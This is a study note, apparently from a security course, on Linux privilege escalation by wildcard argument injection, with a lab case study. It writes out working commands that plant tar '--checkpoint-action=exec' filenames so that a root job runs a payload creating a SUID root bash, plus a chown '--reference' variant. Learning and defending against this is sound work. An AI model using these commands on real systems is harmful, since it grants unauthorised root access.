#linux #privesc

A privileged job (root cron, or a root/sudo script) runs a command with a shell **wildcard** (`*`) in a directory **you can write to**. The shell expands `*` into the filenames in that dir *before* the command runs — so if you create files whose names look like command-line options, they get passed as flags. The command can't tell a filename from an option. Classic targets: `tar`, `chown`, `chmod`, `rsync`, `7z`.

## Detection
- A cron/sudo script (→ [[Cron Jobs]], [[11.4 SUID + GTFO Bins]]) that runs something like `tar czf out.tgz *`, `chown -R root *`, `chmod 644 *` after a `cd` into a dir you can write.
- Prerequisite: **write access to the directory** the `*` expands in.
```bash
cat /path/to/the/script          # look for `*` in the command
ls -ld /the/wildcard/dir ; [ -w /the/wildcard/dir ] && echo WRITABLE
```

## tar — the most common (checkpoint actions)
`tar` has `--checkpoint=N` (fire an action every N records) and `--checkpoint-action=exec=<cmd>` (run a command at each checkpoint). Create those as **filenames** plus a payload script:
```bash
cd /the/wildcard/dir
echo 'cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' > runme.sh   # or copy the flag
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
# when the root job runs `tar ... *`, the '*' expands to include those filenames,
# tar reads them as options, and runs runme.sh AS ROOT
```
- `touch -- '...'` : the `--` stops `touch` treating the weird names as its own options.
- After the job fires: `/tmp/rootbash -p` → root (or read the flag your payload copied).

## chown / chmod variants
Use `--reference=FILE` to copy ownership/mode from a file you control:
```bash
touch -- '--reference=myfile'    # chown -R root * → chowns using myfile's owner
```

## Conditions / when it fails
- The job must use `*` (an explicit file list is safe).
- You need write access to the expansion dir.
- Runs as root (or higher-priv user).
- `secure_path` / PATH tricks are irrelevant here — this is **argument** injection, not PATH.

---
## Case study — CYBR401 Lab 8 (c09 → root)
`sudo -l` gave `(root) NOPASSWD: /usr/local/sbin/run-report`. Reading the script:
```bash
#!/bin/bash
cd /opt/reports/src || exit 1
/bin/tar czf /opt/reports/out.tgz *      # ← wildcard, run as root via sudo
```
`/opt/reports/src` was writable. Dropped the checkpoint files + payload, ran `sudo run-report`, tar executed the payload as root. One misconfiguration: a root tar with a `*` in a writable dir. Defender fix: use explicit file lists, or `--` before the glob, or run from a dir users can't write.

**Takeaways logged:** `*` in a root-run command + writable dir = argument injection. For tar, `--checkpoint`/`--checkpoint-action=exec` as filenames. Read the sudo/cron script's *body* — the bug is in how it calls the command, not the command itself.

---
Related: [[Cron Jobs]] · [[11.4 SUID + GTFO Bins]] · [[PATH Hijacking]] · [[11.1 Where to start]] (Phase 5) · GTFOBins (tar/chown → "Sudo")
